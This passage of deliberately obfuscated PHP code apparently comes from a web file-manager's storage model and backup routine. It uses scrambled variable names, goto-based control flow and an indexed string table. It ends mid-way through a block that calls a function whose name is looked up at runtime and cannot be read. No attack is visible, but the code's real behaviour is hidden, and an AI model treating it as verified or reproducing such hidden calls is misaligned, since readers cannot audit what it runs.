÷—Ï)->select(); if (!$d÷£òÕ´î) { return !1; } $d÷£òÕ´î = array_sort_by($d÷£òÕ´î, $c¶ñŸÇæè[423]); $eÖğÏˆÍâ„ = $d÷£òÕ´î[0][$c¶ñŸÇæè[395]]; } return $this->pathInfo($eÖğÏˆÍâ„, !0); } protected function updateModifyTime($B®é›‚Â£) { goto dŒõÊ‘–Ñ; dŒõÊ‘–Ñ: $Bù‹ö•ÔÅÊ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$B®é›‚Â£) { return; } if (!is_array($B®é›‚Â£)) { $B®é›‚Â£ = array($B®é›‚Â£); } goto aœŒì—Àš¨; aœŒì—Àš¨: foreach ($B®é›‚Â£ as $aÊƒ„ÆÖ„Ç => $cÔù¡†¿ê‹) { $B®é›‚Â£[$aÊƒ„ÆÖ„Ç] = intval($cÔù¡†¿ê‹); $this->sourceCacheClear($cÔù¡†¿ê‹); } $e˜â¿ŒĞ»’ = array($Bù‹ö•ÔÅÊ[395] => array($Bù‹ö•ÔÅÊ[7], $B®é›‚Â£)); $dØ¾Ó‹ Ù¬ = array($Bù‹ö•ÔÅÊ[552] => USER_ID, $Bù‹ö•ÔÅÊ[417] => time()); goto C„Ûèøå‚…; C„Ûèøå‚…: $this->where($e˜â¿ŒĞ»’)->save($dØ¾Ó‹ Ù¬); goto fÈ¦Êèã…§; fÈ¦Êèã…§: } public function folderSizeReset($báŞãßèå, $A‡ßÛ„ÚÎÚ = false) { goto b«ï«‰Çİ…; Båà‰À„Ÿ¯: $CÏˆš±ˆÜÊ[] = $B›«ÛÁè˜…[$Bšàİéƒ¢[395]]; $DáˆÒ´†¨ = array($Bšàİéƒ¢[395] => array($Bšàİéƒ¢[411], $CÏˆš±ˆÜÊ)); if ($A‡ßÛ„ÚÎÚ < 0) { $DáˆÒ´†¨[$Bšàİéƒ¢[78]] = array($Bšàİéƒ¢[963], abs($A‡ßÛ„ÚÎÚ)); } goto FÄ£èëÑù¢; Cç¼ï´‘¨Â: $Bºƒõğá«ˆ = $Bšàİéƒ¢[1968] . $báŞãßèå; CacheLock::lock($Bºƒõğá«ˆ, 20); if ($A‡ßÛ„ÚÎÚ === !1) { $this->sourceCacheClear($báŞãßèå); $B›«ÛÁè˜… = $this->sourceInfo($báŞãßèå); $DáˆÒ´†¨ = array($Bšàİéƒ¢[394] => $báŞãßèå, $Bšàİéƒ¢[422] => 0); $EšÕÌŒõ = $this->where($DáˆÒ´†¨)->sum($Bšàİéƒ¢[78]); $A‡ßÛ„ÚÎÚ = intval($EšÕÌŒõ) - intval($B›«ÛÁè˜…[$Bšàİéƒ¢[78]]); } goto a¦‘È¬¾Ÿ; b«ï«‰Çİ…: $Bšàİéƒ¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->statusIgnoreResetSpace) { return; } $B›«ÛÁè˜… = $this->sourceInfo($báŞãßèå); goto Cç¼ï´‘¨Â; FÄ£èëÑù¢: $this->where($DáˆÒ´†¨)->setAdd($Bšàİéƒ¢[78], $A‡ßÛ„ÚÎÚ); CacheLock::unlock($Bºƒõğá«ˆ); $bÎÉÁŠªî  = $Bšàİéƒ¢[1969] . $B›«ÛÁè˜…[$Bšàİéƒ¢[404]] . $Bšàİéƒ¢[4] . $B›«ÛÁè˜…[$Bšàİéƒ¢[484]]; goto b˜²Õ±ëá»; a¦‘È¬¾Ÿ: if ($A‡ßÛ„ÚÎÚ == 0) { return CacheLock::unlock($Bºƒõğá«ˆ); } $CÏˆš±ˆÜÊ = $this->parentLevelArray($B›«ÛÁè˜…[$Bšàİéƒ¢[487]]); if (!$CÏˆš±ˆÜÊ) { $CÏˆš±ˆÜÊ = array(); } goto Båà‰À„Ÿ¯; b˜²Õ±ëá»: $aŠñáµ‘Ò” = array($B›«ÛÁè˜…[$Bšàİéƒ¢[404]], $B›«ÛÁè˜…[$Bšàİéƒ¢[484]]); TaskRun::timeLimitCall($bÎÉÁŠªî , $Bšàİéƒ¢[1970], $aŠñáµ‘Ò”, 1.5); goto Aá ¾Ä¢¯; Aá ¾Ä¢¯: } public function folderSizeResetChildren($cŞô½™ˆ) { goto EÙ±„ÙÒ£¿; AÜ¸—…’‚¹: foreach ($CöãÜ¹®Õ« as $cÖ­°¦òçÈ) { if ($cÖ­°¦òçÈ[$fÈ¢Ç’Ü[78]] == $cÖ­°¦òçÈ[$fÈ¢Ç’Ü[1972]]) { continue; } $DæÉøì®óÎ[] = array($fÈ¢Ç’Ü[395], $cÖ­°¦òçÈ[$fÈ¢Ç’Ü[395]], $fÈ¢Ç’Ü[78], $cÖ­°¦òçÈ[$fÈ¢Ç’Ü[78]]); } $this->saveAll($DæÉøì®óÎ); goto e¸§ŸóˆéÀ; bÑ‹¯‡©ÜŸ: $FÌáË·‹ÅÜ = array($fÈ¢Ç’Ü[546] => 1, $fÈ¢Ç’Ü[553] => array($fÈ¢Ç’Ü[512], $Eè‡Œ†à†½[$fÈ¢Ç’Ü[487]] . $cŞô½™ˆ . $fÈ¢Ç’Ü[513])); $cà£ìñ„¡ = $fÈ¢Ç’Ü[1971]; $CöãÜ¹®Õ« = $this->field($cà£ìñ„¡)->where($FÌáË·‹ÅÜ)->select(); goto f²„É† ½ä; EÙ±„ÙÒ£¿: $fÈ¢Ç’Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->sourceCacheClear($cŞô½™ˆ); $Eè‡Œ†à†½ = $this->sourceInfo($cŞô½™ˆ); goto bÑ‹¯‡©ÜŸ; f²„É† ½ä: $FÌáË·‹ÅÜ[$fÈ¢Ç’Ü[403]] = 0; $aÀë™¶ƒ«ƒ = $this->field($cà£ìñ„¡)->where($FÌáË·‹ÅÜ)->select(); if (!$aÀë™¶ƒ«ƒ) { return; } goto D‘¾å†ÍªÂ; D‘¾å†ÍªÂ: $CöãÜ¹®Õ«[] = $Eè‡Œ†à†½; $CöãÜ¹®Õ« = array_to_keyvalue($CöãÜ¹®Õ«, $fÈ¢Ç’Ü[395]); foreach ($CöãÜ¹®Õ« as $AÓñàù‘­× => $cÖ­°¦òçÈ) { $CöãÜ¹®Õ«[$AÓñàù‘­×][$fÈ¢Ç’Ü[1972]] = $CöãÜ¹®Õ«[$AÓñàù‘­×][$fÈ¢Ç’Ü[78]]; $CöãÜ¹®Õ«[$AÓñàù‘­×][$fÈ¢Ç’Ü[78]] = 0; } goto C¾Æëƒ†; C¾Æëƒ†: foreach ($aÀë™¶ƒ«ƒ as $cÖ­°¦òçÈ) { $BÕµ¼Ş¬ø  = $cÖ­°¦òçÈ[$fÈ¢Ç’Ü[478]] . $fÈ¢Ç’Ü[33]; if (!isset($CöãÜ¹®Õ«[$BÕµ¼Ş¬ø ])) { continue; } if ($cÖ­°¦òçÈ[$fÈ¢Ç’Ü[423]] == $CöãÜ¹®Õ«[$BÕµ¼Ş¬ø ][$fÈ¢Ç’Ü[423]]) { $CöãÜ¹®Õ«[$BÕµ¼Ş¬ø ][$fÈ¢Ç’Ü[78]] += $cÖ­°¦òçÈ[$fÈ¢Ç’Ü[78]]; } } foreach ($CöãÜ¹®Õ« as $cÖ­°¦òçÈ) { $d“¨§Øèó = $this->parentLevelArray($cÖ­°¦òçÈ[$fÈ¢Ç’Ü[487]]); foreach ($d“¨§Øèó as $BÕµ¼Ş¬ø ) { $BÕµ¼Ş¬ø  = $BÕµ¼Ş¬ø  . $fÈ¢Ç’Ü[33]; if (!isset($CöãÜ¹®Õ«[$BÕµ¼Ş¬ø ])) { continue; } if ($cÖ­°¦òçÈ[$fÈ¢Ç’Ü[423]] == $CöãÜ¹®Õ«[$BÕµ¼Ş¬ø ][$fÈ¢Ç’Ü[423]]) { $CöãÜ¹®Õ«[$BÕµ¼Ş¬ø ][$fÈ¢Ç’Ü[78]] += $cÖ­°¦òçÈ[$fÈ¢Ç’Ü[78]]; } } } $DæÉøì®óÎ = array(); goto AÜ¸—…’‚¹; e¸§ŸóˆéÀ: } public function userSpaceReset($AÑ¤‡ÖÚ = false) { $e˜·ßµÌØÁ =& $_SERVER[ÒÆ›ÆØÎ¾]; $A·ÁÍç¾äÔ = $this->where(array($e˜·ßµÌØÁ[404] => self::TYPE_USER, $e˜·ßµÌØÁ[484] => $AÑ¤‡ÖÚ, $e˜·ßµÌØÁ[403] => 0))->sum($e˜·ßµÌØÁ[78]); $A·ÁÍç¾äÔ = !$A·ÁÍç¾äÔ || $A·ÁÍç¾äÔ <= 0 ? 0 : $A·ÁÍç¾äÔ; Model($e˜·ßµÌØÁ[502])->userEdit($AÑ¤‡ÖÚ, array($e˜·ßµÌØÁ[1667] => $A·ÁÍç¾äÔ)); } public function targetSpaceUpdate($Aš§Ôö, $Bò¥’ğË°Š) { $aå„ÃĞ„¥¥ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$Bò¥’ğË°Š) { return; } if (!in_array($Aš§Ôö, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $b×òŠÜ„á = $this->targetSpaceSize($Aš§Ôö, $Bò¥’ğË°Š); if ($Aš§Ôö == self::TYPE_USER) { Model($aå„ÃĞ„¥¥[502])->userEdit($Bò¥’ğË°Š, array($aå„ÃĞ„¥¥[1667] => $b×òŠÜ„á)); } else { if ($Aš§Ôö == self::TYPE_GROUP) { Model($aå„ÃĞ„¥¥[486])->groupEdit($Bò¥’ğË°Š, array($aå„ÃĞ„¥¥[1667] => $b×òŠÜ„á)); } } } public function targetSpaceSize($A›š¾­ëÎ, $FÁé‹å¨¼¨) { goto Då³Íğæö; Då³Íğæö: $c¡ËÒä±ˆ‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fä¿†”´ƒ­ = $this->sourceRoot($A›š¾­ëÎ, $FÁé‹å¨¼¨, !0); if (!$Fä¿†”´ƒ­) { return 0; } goto Aê…Šç«î; C²Áì²èÔ: $cØ‹©¿ÙŠÜ = array_to_keyvalue($cØ‹©¿ÙŠÜ, $c¡ËÒä±ˆ‹[33], $c¡ËÒä±ˆ‹[395]); $cØ‹©¿ÙŠÜ = array_unique(array_filter($cØ‹©¿ÙŠÜ)); if ($cØ‹©¿ÙŠÜ) { $aŸÎŞÈØİ = array($c¡ËÒä±ˆ‹[410] => array($c¡ËÒä±ˆ‹[411], $cØ‹©¿ÙŠÜ)); $C¿ˆš¨— += floatval($this->where($aŸÎŞÈØİ)->sum($c¡ËÒä±ˆ‹[78])); } goto E†È‰­Âƒ; E†È‰­Âƒ: $C¿ˆš¨— = !$C¿ˆš¨— || $C¿ˆš¨— <= 0 ? 0 : $C¿ˆš¨—; return $C¿ˆš¨—; goto Aêàº¾¹Øñ; Aê…Šç«î: $C¿ˆš¨— = floatval($Fä¿†”´ƒ­[$c¡ËÒä±ˆ‹[78]]); $aŸÎŞÈØİ = array($c¡ËÒä±ˆ‹[553] => array($c¡ËÒä±ˆ‹[512], $c¡ËÒä±ˆ‹[498] . $Fä¿†”´ƒ­[$c¡ËÒä±ˆ‹[395]] . $c¡ËÒä±ˆ‹[513])); $cØ‹©¿ÙŠÜ = Model($c¡ËÒä±ˆ‹[421])->field($c¡ËÒä±ˆ‹[410])->where($aŸÎŞÈØİ)->select(); goto C²Áì²èÔ; Aêàº¾¹Øñ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($BÚ¹ÇÙ’¨Ù) { return $this->fileTypeProfile($BÚ¹ÇÙ’¨Ù, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Aõ¹“ç‹–¦) { return $this->fileTypeProfile($Aõ¹“ç‹–¦, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Cºå«ĞµÚ, $Eó¿µÖ‹®) { goto E‹Ø‰‰æ·Ï; fÏÆÎÊÚåØ: if ($b‚ƒÙÅßİ) { return $b‚ƒÙÅßİ; } $bÈ—·ŸŒ²ö = array($C¿Âë¡­ìÀ[546] => 0); if ($Cºå«ĞµÚ != !1) { $bÈ—·ŸŒ²ö[$C¿Âë¡­ìÀ[484]] = $Cºå«ĞµÚ; $bÈ—·ŸŒ²ö[$C¿Âë¡­ìÀ[404]] = $Eó¿µÖ‹®; } goto Eøç¥ºâ«À; Eøç¥ºâ«À: $f˜©Ü¯¬Ãì = array(); $f˜©Ü¯¬Ãì[$C¿Âë¡­ìÀ[1974]] = array($C¿Âë¡­ìÀ[1975] => LNG($C¿Âë¡­ìÀ[1974]), $C¿Âë¡­ìÀ[1976] => $this->where($bÈ—·ŸŒ²ö)->count(), $C¿Âë¡­ìÀ[548] => $this->where($bÈ—·ŸŒ²ö)->sum($C¿Âë¡­ìÀ[78])); $b…ƒÁİœÄ« = KodIO::fileTypeList(); goto DÑ‡ïÖ Àé; E‹Ø‰‰æ·Ï: $C¿Âë¡­ìÀ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÁ©Éñ®¶” = $C¿Âë¡­ìÀ[1973] . $Cºå«ĞµÚ . $C¿Âë¡­ìÀ[71] . $Eó¿µÖ‹®; $b‚ƒÙÅßİ = Cache::get($cÁ©Éñ®¶”); goto fÏÆÎÊÚåØ; DÑ‡ïÖ Àé: foreach ($b…ƒÁİœÄ« as $F­ĞÚ‘©«Ğ => $EœÇèÜ¶›ƒ) { $bÈ—·ŸŒ²ö[$C¿Âë¡­ìÀ[405]] = $this->fileTypeWhere($F­ĞÚ‘©«Ğ); $f˜©Ü¯¬Ãì[$F­ĞÚ‘©«Ğ] = array($C¿Âë¡­ìÀ[1975] => $EœÇèÜ¶›ƒ[$C¿Âë¡­ìÀ[28]], $C¿Âë¡­ìÀ[1976] => $this->where($bÈ—·ŸŒ²ö)->count(), $C¿Âë¡­ìÀ[548] => $this->where($bÈ—·ŸŒ²ö)->sum($C¿Âë¡­ìÀ[78])); } Cache::set($cÁ©Éñ®¶”, $f˜©Ü¯¬Ãì, 1200); return $f˜©Ü¯¬Ãì; goto DÚòİòøÌ; DÚòİòøÌ: } public function fileNameExist($AÖøèğ®Ç‰, $BÈ°Ï´ñĞ) { $Eâ‡êÆÀğà =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÏŠÛå¨î = $this->where(array($Eâ‡êÆÀğà[478] => $AÖøèğ®Ç‰, $Eâ‡êÆÀğà[28] => $BÈ°Ï´ñĞ, $Eâ‡êÆÀğà[423] => 0))->find(); return is_array($EÏŠÛå¨î) ? $EÏŠÛå¨î[$Eâ‡êÆÀğà[395]] : !1; } public function childList($e¦‰ÛôƒÀ) { goto A¡ïåÃÌùñ; FÒ–ö‰É¸: $BŞµ•ÂõÜ£ = array($B¯”å§Ÿ¾¨[478] => intval($e¦‰ÛôƒÀ), $B¯”å§Ÿ¾¨[423] => 0); $a²˜èË¼ÊÉ = $this->where($BŞµ•ÂõÜ£)->select(); $a²˜èË¼ÊÉ = $a²˜èË¼ÊÉ ? $a²˜èË¼ÊÉ : array(); goto eî®ßºå‚Á; A¡ïåÃÌùñ: $B¯”å§Ÿ¾¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÖãóóÛèÎ = $B¯”å§Ÿ¾¨[1951] . $e¦‰ÛôƒÀ; if (isset(self::$cacheChildList[$dÖãóóÛèÎ])) { return self::$cacheChildList[$dÖãóóÛèÎ]; } goto FÒ–ö‰É¸; eî®ßºå‚Á: self::$cacheChildList[$dÖãóóÛèÎ] = $a²˜èË¼ÊÉ; foreach ($a²˜èË¼ÊÉ as $Bİ†™¼ª·ƒ) { $dÖãóóÛèÎ = $B¯”å§Ÿ¾¨[438] . $Bİ†™¼ª·ƒ[$B¯”å§Ÿ¾¨[395]]; self::$cacheSourceInfo[$dÖãóóÛèÎ] = $Bİ†™¼ª·ƒ; } return $a²˜èË¼ÊÉ; goto fŠ’àôÖ·£; fŠ’àôÖ·£: } public function fileNameAuto($F³ÀÊ«áó›, $Eå›ªªãĞ, $eçÓÆ†¨ = REPEAT_RENAME, $C–­¢Åº = false) { $DëŞ§öé… =& $_SERVER[ÒÆ›ÆØÎ¾]; $F´ÁÙ¸Ë¯Œ = array($DëŞ§öé…[478] => $F³ÀÊ«áó›, $DëŞ§öé…[423] => 0, $DëŞ§öé…[28] => array($DëŞ§öé…[380], $Eå›ªªãĞ . $DëŞ§öé…[381])); $eÏ°Ü…Ôš = $this->field($DëŞ§öé…[28])->where($F´ÁÙ¸Ë¯Œ)->select(); $B½š¥‹ÊÎ± = array_to_keyvalue($eÏ°Ü…Ôš, $DëŞ§öé…[33], $DëŞ§öé…[28]); return $this->fileNameAutoGet($B½š¥‹ÊÎ±, $Eå›ªªãĞ, $eçÓÆ†¨, $C–­¢Åº); } public function fileNameAutoGet($e¸®Ë¬Ì³, $FâÔê³ßÔÜ, $Eä°âÓùßí, $b÷œ·ÃÊ…) { $fÄèÄ†ğ” =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($Eä°âÓùßí == REPEAT_REPLACE || !$e¸®Ë¬Ì³ || !in_array_not_case($FâÔê³ßÔÜ, $e¸®Ë¬Ì³) || $b÷œ·ÃÊ… && $Eä°âÓùßí != REPEAT_RENAME_FOLDER) { return $FâÔê³ßÔÜ; } if ($Eä°âÓùßí == REPEAT_SKIP) { return !1; } $BµËóÀ¹ƒİ = $fÄèÄ†ğ”[95] . get_path_ext($FâÔê³ßÔÜ); $BµËóÀ¹ƒİ = $BµËóÀ¹ƒİ == $fÄèÄ†ğ”[95] || $b÷œ·ÃÊ… ? $fÄèÄ†ğ”[33] : $BµËóÀ¹ƒİ; for ($b‹¾½«õ½• = 1; $b‹¾½«õ½• <= count($e¸®Ë¬Ì³) + 1; $b‹¾½«õ½•++) { $a†éñ’×ùƒ = substr($FâÔê³ßÔÜ, 0, strlen($FâÔê³ßÔÜ) - strlen($BµËóÀ¹ƒİ)); $DòîÛ½»ÌÙ = $a†éñ’×ùƒ . "\50{$b‹¾½«õ½•}\x29{$BµËóÀ¹ƒİ}"; if (!in_array_not_case($DòîÛ½»ÌÙ, $e¸®Ë¬Ì³)) { return $DòîÛ½»ÌÙ; } } } } goto dÙ“Š‰æ²¸; fÏ÷¶ø‡ÎÀ: class BackupFile { public function __construct() { } public function index() { goto e×—Ñ†Î‹; cóÖ½ŒÇäù: $eÚÓŒÄ…øš = 1000; $C“Å‹İ = $eìÑ‡÷Ü¼› = 0; $dÊ’ç®Òƒ = array(); goto a‹‹È×¬ˆÉ; EêºÃğ¬İì: $BŸ³‰Œ§Å = !0; $B·ôö¶õñº = $this->storeIds(); $C¹á–¾ß®Ÿ = 1; goto cóÖ½ŒÇäù; e×—Ñ†Î‹: $eÚ¢ˆæÌ» = Backup::get(); $CÇÔÎ³‘™² = $eÚ¢ˆæÌ»[$_SERVER[ÒÆ›ÆØÎ¾][291]][$_SERVER[ÒÆ›ÆØÎ¾][193]][$_SERVER[ÒÆ›ÆØÎ¾][447]]; $Cœ”Ó™¨ö = array($_SERVER[ÒÆ›ÆØÎ¾][448] => array($_SERVER[ÒÆ›ÆØÎ¾][764], $CÇÔÎ³‘™²), $_SERVER[ÒÆ›ÆØÎ¾][765] => array($_SERVER[ÒÆ›ÆØÎ¾][329], $eÚ¢ˆæÌ»[$_SERVER[ÒÆ›ÆØÎ¾][704]])); goto fÑ¹«ñ»®ò; fÑ¹«ñ»®ò: $E”‡ç­Ç‡… = (int) Model($_SERVER[ÒÆ›ÆØÎ¾][739])->where($Cœ”Ó™¨ö)->count($_SERVER[ÒÆ›ÆØÎ¾][447]); $A—‘‹Îí·š = (int) Model($_SERVER[ÒÆ›ÆØÎ¾][739])->where($Cœ”Ó™¨ö)->sum($_SERVER[ÒÆ›ÆØÎ¾][78]); $dåÏÄó‚…” = new TaskFileTransfer($_SERVER[ÒÆ›ÆØÎ¾][766], $_SERVER[ÒÆ›ÆØÎ¾][734], $E”‡ç­Ç‡…, LNG($_SERVER[ÒÆ›ÆØÎ¾][735]) . $_SERVER[ÒÆ›ÆØÎ¾][736] . LNG($_SERVER[ÒÆ›ÆØÎ¾][767])); goto aç§©½÷ùˆ; aç§©½÷ùˆ: $dåÏÄó‚…”->task[$_SERVER[ÒÆ›ÆØÎ¾][715]] = $A—‘‹Îí·š; $FÁ¿¸Ô…‰ = array($_SERVER[ÒÆ›ÆØÎ¾][768] => $E”‡ç­Ç‡…, $_SERVER[ÒÆ›ÆØÎ¾][769] => $A—‘‹Îí·š, $_SERVER[ÒÆ›ÆØÎ¾][770] => time()); Backup::set($FÁ¿¸Ô…‰); goto EêºÃğ¬İì; dçÉ®–ñÃŒ: $this->_fileFilter($dÊ’ç®Òƒ); return !0; goto d“±—¼»‡†; a‹‹È×¬ˆÉ: $B±Â¬å¤ã¿ = $Dôëñß¢ò = 0; do { $FÕµë•ŒÁ‘ = $_SERVER[ÒÆ›ÆØÎ¾][771]; $AäÊ¥¯è„ = Model($_SERVER[ÒÆ›ÆØÎ¾][739])->where($Cœ”Ó™¨ö)->field($FÕµë•ŒÁ‘)->order($_SERVER[ÒÆ›ÆØÎ¾][772])->selectPage($eÚÓŒÄ…øš, $C¹á–¾ß®Ÿ); $FÊé›ÒôÂÃ = !empty($AäÊ¥¯è„[$_SERVER[ÒÆ›ÆØÎ¾][367]]) ? $AäÊ¥¯è„[$_SERVER[ÒÆ›ÆØÎ¾][367]] : array(); foreach ($FÊé›ÒôÂÃ as $AÔ°Ù…Ğó) { goto bÌµ¾‘À; cÈæ‡§ã³¢: if (IO::exist($D×’°…ñÔ)) { $dåÏÄó‚…”->updateFileEnd($AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][28]], $AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][78]]); } else { $D×’°…ñÔ = get_path_father($D×’°…ñÔ); IO::mkdir($D×’°…ñÔ); if (!IO::copy($EÓÑ¿´÷™‰, $D×’°…ñÔ, $_SERVER[ÒÆ›ÆØÎ¾][775])) { write_log($_SERVER[ÒÆ›ÆØÎ¾][776] . $EÓÑ¿´÷™‰ . $_SERVER[ÒÆ›ÆØÎ¾][759] . $D×’°…ñÔ . $_SERVER[ÒÆ›ÆØÎ¾][504], $_SERVER[ÒÆ›ÆØÎ¾][734]); $BŸ³‰Œ§Å = !1; break; } } $CÇÔÎ³‘™² = $AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][447]]; $eìÑ‡÷Ü¼› += 1; goto E¦½¥Ôß; E¦½¥Ôß: $C“Å‹İ += $AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][78]]; $Dôëñß¢ò += 1; $B±Â¬å¤ã¿ += $AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][78]]; goto B»é†¾£ä‚; bÌµ¾‘À: if (!$this->_fileExist($AÔ°Ù…Ğó, $dÊ’ç®Òƒ, $B·ôö¶õñº)) { $E”‡ç­Ç‡… -= 1; $A—‘‹Îí·š -= (int) $AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][78]]; write_log("\x66\x69\154\x65\x20\156\157\x74\x20\145\x78\151\x73\x74\x2e\x66\x69\154\x65\x49\104\x3a{$AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][447]]}\54\40\160\x61\x74\150\x3a{$AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][76]]}", $_SERVER[ÒÆ›ÆØÎ¾][773]); continue; } $EÓÑ¿´÷™‰ = $AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][76]]; $D×’°…ñÔ = "\173\151\x6f\x3a{$eÚ¢ˆæÌ»[$_SERVER[ÒÆ›ÆØÎ¾][704]]}\x7d" . substr($EÓÑ¿´÷™‰, strlen("\173\x69\157\72{$AÔ°Ù…Ğó[$_SERVER[ÒÆ›ÆØÎ¾][774]]}\175")); goto cÈæ‡§ã³¢; B»é†¾£ä‚: if ($C“Å‹İ >= 1024 * 1024 * 100) { $FÁ¿¸Ô…‰ = array($_SERVER[ÒÆ›ÆØÎ¾][777] => $CÇÔÎ³‘™², $_SERVER[ÒÆ›ÆØÎ¾][778] => $Dôëñß¢ò, $_SERVER[ÒÆ›ÆØÎ¾][779] => $B±Â¬å¤ã¿); Backup::set($FÁ¿¸Ô…‰); $C“Å‹İ = $eìÑ‡÷Ü¼› = 0; } goto Bìê•ô…½‡; Bìê•ô…½‡: } $c™¦ŞÌôİš = count($FÊé›ÒôÂÃ); $C¹á–¾ß®Ÿ++; } while ($c™¦ŞÌôİš == $eÚÓŒÄ…øš); $dåÏÄó‚…”->end(); goto b¬‘óïõšö; b¬‘óïõšö: $FÁ¿¸Ô…‰ = array($_SERVER[ÒÆ›ÆØÎ¾][780] => 1, $_SERVER[ÒÆ›ÆØÎ¾][476] => time(), $_SERVER[ÒÆ›ÆØÎ¾][727] => 1, $_SERVER[ÒÆ›ÆØÎ¾][777] => $CÇÔÎ³‘™², $_SERVER[ÒÆ›ÆØÎ¾][769] => $A—‘‹Îí·š, $_SERVER[ÒÆ›ÆØÎ¾][768] => $E”‡ç­Ç‡…, $_SERVER[ÒÆ›ÆØÎ¾][781] => time()); if ($eìÑ‡÷Ü¼›) { $FÁ¿¸Ô…‰[$_SERVER[ÒÆ›ÆØÎ¾][778]] = $Dôëñß¢ò; $FÁ¿¸Ô…‰[$_SERVER[ÒÆ›ÆØÎ¾][779]] = $B±Â¬å¤ã¿; } Backup::set($FÁ¿¸Ô…‰); goto dçÉ®–ñÃŒ; d“±—¼»‡†: } private function _fileExist($b‰…Ì½ÙÌ, &$EÔªšàƒƒ§, $B¾¾ĞÍä›ø) { goto dé‰å’ÓÙŠ; eä™Õ†Â¿: if (IO::exist($D…ïÃŞ•˜«)) { $EÔªšàƒƒ§[] = $b‰…Ì½ÙÌ[$C‹ª±ÆÕÚ…[447]]; return !1; } $AÛãÂï§Òñ = array($C‹ª±ÆÕÚ…[774] => $b‰…Ì½ÙÌ[$C‹ª±ÆÕÚ…[774]], $C‹ª±ÆÕÚ…[76] => array($C‹ª±ÆÕÚ…[380], "{$D…ïÃŞ•˜«}\x25")); $Bœ˜„í½âÂ = Model($C‹ª±ÆÕÚ…[739])->where($AÛãÂï§Òñ)->field($C‹ª±ÆÕÚ…[448])->select(); goto EŞ™ÌàÊÛ«; dé‰å’ÓÙŠ: $C‹ª±ÆÕÚ… =& $_SERVER[ÒÆ›ÆØÎ¾]; $DŸšÅ = $b‰…Ì½ÙÌ[$C‹ª±ÆÕÚ…[76]]; if (in_array($b‰…Ì½ÙÌ[$C‹ª±ÆÕÚ…[447]], $EÔªšàƒƒ§)) { return !1; } goto D÷Å¸Ö»Â±; D÷Å¸Ö»Â±: if (!in_array($b‰…Ì½ÙÌ[$C‹ª±ÆÕÚ…[774]], $B¾¾ĞÍä›ø)) { return !1; } if (IO::exist($DŸšÅ)) { return !0; } $D…ïÃŞ•˜« = get_path_father($DŸšÅ); goto eä™Õ†Â¿; EŞ™ÌàÊÛ«: $EÔªšàƒƒ§ = array_merge($EÔªšàƒƒ§, array_to_keyvalue($Bœ˜„í½âÂ, $C‹ª±ÆÕÚ…[33], $C‹ª±ÆÕÚ…[447])); return !1; goto E„‚ÖÎ¨¬ã; E„‚ÖÎ¨¬ã: } private function _fileFilter($A·É°ÛùÁÅ) { $DÄƒÓ²—ŠÄ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($A·É°ÛùÁÅ)) { return; } $aÄ ÖÇ«¤  = array($DÄƒÓ²—ŠÄ[447] => array($DÄƒÓ²—ŠÄ[7], array_unique($A·É°ÛùÁÅ))); $eÔ‘Üæ³åÚ = Model($DÄƒÓ²—ŠÄ[782])->where($aÄ ÖÇ«¤ )->field($DÄƒÓ²—ŠÄ[395])->select(); foreach ($eÔ‘Üæ³åÚ as $bÌâ„ó™ƒØ) { Model($DÄƒÓ²—ŠÄ[782])->remove($bÌâ„ó™ƒØ[$DÄƒÓ²—ŠÄ[395]], !1); } } private function storeIds() { $Añ‡–˜§¿Ã =& $_SERVER[ÒÆ›ÆØÎ¾]; $C˜²‚ª¿‹ = Model($Añ‡–˜§¿Ã[719])->listData(); $b›š‚õš¤ = array(); $dğ…²ˆ›òƒ = $GLOBALS[$Añ‡–˜§¿Ã[6]][$Añ‡–˜§¿Ã[88]][$Añ‡–˜§¿Ã[783]]; foreach ($C˜²‚ª¿‹ as $C…Ğî·í”) { $FßíˆÚÛ®Ç = strtolower($C…Ğî·í”[$Añ‡–˜§¿Ã[94]]); if (!isset($dğ…²ˆ›òƒ[$FßíˆÚÛ®Ç])) { continue; } $FËì¤ÁÔ± = $Añ‡–˜§¿Ã[72] . (isset($dğ…²ˆ›òƒ[$FßíˆÚÛ®Ç]) ? $dğ…²ˆ›òƒ[$FßíˆÚÛ®Ç] : ucfirst($FßíˆÚÛ®Ç)); if (!class_exists($FËì¤ÁÔ±)) { continue; } $b›š‚õš¤[] = $C…Ğî·í”[$Añ‡–˜§¿Ã[393]]; } return $b›š‚õš¤; } } if (!isset($_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][784]]) || !isset($_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][785]])) { goto dÑƒª°ô¡•; eçàÅ‚ÛÈ´: $fíö¸¥ƒŞ = explode($_SERVER[ÒÆ›ÆØÎ¾][229], $AÃ§Ã‰è¦); if (count($fíö¸¥ƒŞ) < $_SERVER[ÒÆ›ÆØÎ¾][575]) { $e²–ÒÀ© = $_SERVER[ÒÆ›ÆØÎ¾][789]; $e²–ÒÀ©(); } $Béñ‘–Ñà = $_SERVER[ÒÆ›ÆØÎ¾][790]; goto Cá›†É²°; dÑƒª°ô¡•: $dŠ‚ÔíØ¼µ = $_SERVER[ÒÆ›ÆØÎ¾][786]; $F²ò†ÃôÑÆ = $_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][787]] . 